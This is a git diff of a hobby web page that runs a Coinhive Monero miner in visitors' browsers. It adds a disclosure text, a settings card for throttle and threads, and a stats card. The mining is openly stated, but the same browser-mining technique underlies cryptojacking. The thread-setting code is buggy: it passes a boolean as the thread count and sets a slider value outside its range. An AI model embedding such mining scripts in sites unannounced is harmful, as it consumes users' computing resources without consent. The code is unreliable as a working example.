@@ -9,12 +9,9 @@
 		
       		<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 		<style>
-		.demo-card-square.mdl-card {
-		  width: 320px;
-		  height: 320px;
-		}
-		.demo-card-square > .mdl-card__title {
-		  color: #fff;
+		.mdl-card__title {
+		  background-color: rgb(63,81,181);
+		  color: rgb(255,255,255);
 		}
 		</style>
 	</head>
@@ -30,65 +27,96 @@
 				<nav class="mdl-navigation mdl-layout--large-screen-only">
 				</div>
 			</header>
-			<div id="maia-main" role="main">
+			<div id="maia-main" role="main">				
 				<div class="maia-aux">
 					<div class="mdc-layout-grid cards-container">
 						<div class="mdc-layout-grid__inner">
-							<div class="mdc-layout-grid__cell card mdl-shadow--2dp">
-								<p>
-									<label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="switch-1">
-										<span class="mdl-switch__label">Full Speed</span>
-										<input type="checkbox" id="fullSpeedSwitch" class="mdl-switch__input" checked>
-									</label>
-								</p>
-								<p style="width:350px;">
-									<span class="mdl-switch__label">Idle Percentage</span>
-									<input class="mdl-slider mdl-js-slider" type="range" min="0" max="80" value="80" id="idleTime" step="10">									
-								</p>
-								<p>
-									<button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="refreshButton">
-										Refresh
-									</button>
-								</p>
+							<div class="mdc-layout-grid__cell--span-12 mdl-card mdl-shadow--2dp">
+								<div class="mdl-card__title">
+									<h2 class="mdl-card__title-text">
+									What is this?</h2>
+								</div>
+								<div class="mdl-card__supporting-text">
+									<p>
+										This is a wee website I'm using to mess about with the Coinhive Monero farming. You can alter the effect it has on the client PC by using the settings below. The heartbeat is a pointless graphic that changes each time a hash is found. The real stats are in the middle.
+									</p>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="mdc-layout-grid cards-container">
+						<div class="mdc-layout-grid__inner">
+							<div class="mdc-layout-grid__cell mdl-card mdl-shadow--2dp">
+								<div class="mdl-card__title">
+									<h2 class="mdl-card__title-text">Settings</h2>
+								</div>
+								<div class="mdl-card__supporting-text">
+									<p>
+										<label class="mdl-switch mdl-js-switch mdl-js-ripple-effect" for="switch-1">
+											<span class="mdl-switch__label">Full Speed</span>
+											<input type="checkbox" id="fullSpeedSwitch" class="mdl-switch__input">
+										</label>
+									</p>
+									<p style="width:350px;">
+										<span class="mdl-switch__label">Threads</span>
+										<input class="mdl-slider mdl-js-slider" type="range" min="1" max="8" value="84" id="threadCount" step="1">									
+									</p>
+									<p style="width:350px;">
+										<span class="mdl-switch__label">Idle Percentage</span>
+										<input class="mdl-slider mdl-js-slider" type="range" min="0" max="80" value="80" id="idleTime" step="10">									
+									</p>
+								</div>
+								<div class="mdl-card__actions mdl-card--border">
+									<p>
+										<a class="mdl-button mdl-button--colored mdl-js-button mdl-js-ripple-effect" id="refreshButton">
+											Refresh
+										</a>
+									</p>
+								</div>
 							</div>
 							<div class="mdc-layout-grid__cell card mdl-shadow--2dp">
-								<ul class="demo-list-two mdl-list">
-									<li class="mdl-list__item mdl-list__item--two-line">
-										<span class="mdl-list__item-primary-content">
-											<i class="material-icons mdl-list__item-avatar">pound</i>
-											<span>Hashes Per Second</span>
-											<span class="mdl-list__item-sub-title" id="hashes"></span>
-										</span>
-									</li>
-									<li class="mdl-list__item mdl-list__item--two-line">
-										<span class="mdl-list__item-primary-content">
-											<i class="material-icons mdl-list__item-avatar">sigma</i>
-											<span>Total Hashes</span>
-											<span class="mdl-list__item-sub-title" id="totalHashes"></span>
-										</span>
-									</li>
-									<li class="mdl-list__item mdl-list__item--two-line">
-										<span class="mdl-list__item-primary-content">
-											<i class="material-icons mdl-list__item-icon">check</i>
-											<span>Accepted Count</span>
-											<span class="mdl-list__item-sub-title" id="acceptedCount"></span>
-										</span>
-									</li>
-									<li class="mdl-list__item mdl-list__item--two-line">
-										<span class="mdl-list__item-primary-content">
-											<i class="material-icons mdl-list__item-icon">format</i>
-											<span>Threads</span>
-											<span class="mdl-list__item-sub-title" id="threads"></span>
-										</span>
-									</li>
-									<li class="mdl-list__item mdl-list__item--two-line">
-										<span class="mdl-list__item-primary-content">
-											<i class="material-icons mdl-list__item-icon">percent</i>
-											<span>Idle Percentage</span>
-											<span class="mdl-list__item-sub-title" id="idlePercentage"></span>
-										</span>
-									</li>
-								</ul>
+								<div class="mdl-card__title">
+									<h2 class="mdl-card__title-text">Stats</h2>
+								</div>
+								<div class="mdl-card__supporting-text">
+									<ul class="demo-list-two mdl-list">
+										<li class="mdl-list__item mdl-list__item--two-line">
+											<span class="mdl-list__item-primary-content">
+												<i class="material-icons mdl-list__item-avatar">pound</i>
+												<span>Hashes Per Second</span>
+												<span class="mdl-list__item-sub-title" id="hashes"></span>
+											</span>
+										</li>
+										<li class="mdl-list__item mdl-list__item--two-line">
+											<span class="mdl-list__item-primary-content">
+												<i class="material-icons mdl-list__item-avatar">sigma</i>
+												<span>Total Hashes</span>
+												<span class="mdl-list__item-sub-title" id="totalHashes"></span>
+											</span>
+										</li>
+										<li class="mdl-list__item mdl-list__item--two-line">
+											<span class="mdl-list__item-primary-content">
+												<i class="material-icons mdl-list__item-icon">check</i>
+												<span>Accepted Count</span>
+												<span class="mdl-list__item-sub-title" id="acceptedCount"></span>
+											</span>
+										</li>
+										<li class="mdl-list__item mdl-list__item--two-line">
+											<span class="mdl-list__item-primary-content">
+												<i class="material-icons mdl-list__item-icon">format</i>
+												<span>Threads</span>
+												<span class="mdl-list__item-sub-title" id="threads"></span>
+											</span>
+										</li>
+										<li class="mdl-list__item mdl-list__item--two-line">
+											<span class="mdl-list__item-primary-content">
+												<i class="material-icons mdl-list__item-icon">percent</i>
+												<span>Idle Percentage</span>
+												<span class="mdl-list__item-sub-title" id="idlePercentage"></span>
+											</span>
+										</li>
+									</ul>
+								</div>
 							</div>						
 							<div class="mdc-layout-grid__cell card mdl-shadow--2dp">
 								<div class="mdl-card__title mdl-card--expand">
@@ -103,7 +131,6 @@
 				</div>
 			</div>
 		</div>
-		
 		
 		<script>
 		/*!
@@ -912,6 +939,11 @@ exports.push([module.i, ":root {\n  --mdc-theme-primary: #212121;\n  --mdc-theme
 					var hashesPerSecond = miner.getHashesPerSecond();
 					var totalHashes = miner.getTotalHashes();
 					var acceptedHashes = miner.getAcceptedHashes();
+					var fullSpeed = $("#fullSpeedSwitch").is(":checked");
+					
+					if (fullSpeed) {
+						$("#threads").html(miner.getNumThreads());
+					}
 
 					$("#hashes").html(hashesPerSecond);
 					$("#totalHashes").html(totalHashes);
@@ -924,15 +956,21 @@ exports.push([module.i, ":root {\n  --mdc-theme-primary: #212121;\n  --mdc-theme
 				
 				$("#refreshButton").click(function() {					
 					var idleSelected = $("#idleTime").val() / 100;
-					var fullSpeed = $("#fullSpeedSwitch").is(":checked") ? 8 : 4;
+					var threads = $("#threadCount").val();
+					var fullSpeed = $("#fullSpeedSwitch").is(":checked");
 
-					$("#threads").html(fullSpeed);
+					$("#threads").html(threads);
 					$("#idlePercentage").html($("#idleTime").val() + "%");
 					
 					miner.stop();	
 					
 					miner.setThrottle(idleSelected);
-					miner.setNumThreads(fullSpeed);
+					if (!fullSpeed) {
+						miner.setAutoThreadsEnabled(false);
+						miner.setNumThreads(fullSpeed);
+					} else {
+						miner.setAutoThreadsEnabled(true);
+					}
 					
 					miner.start();
 				});
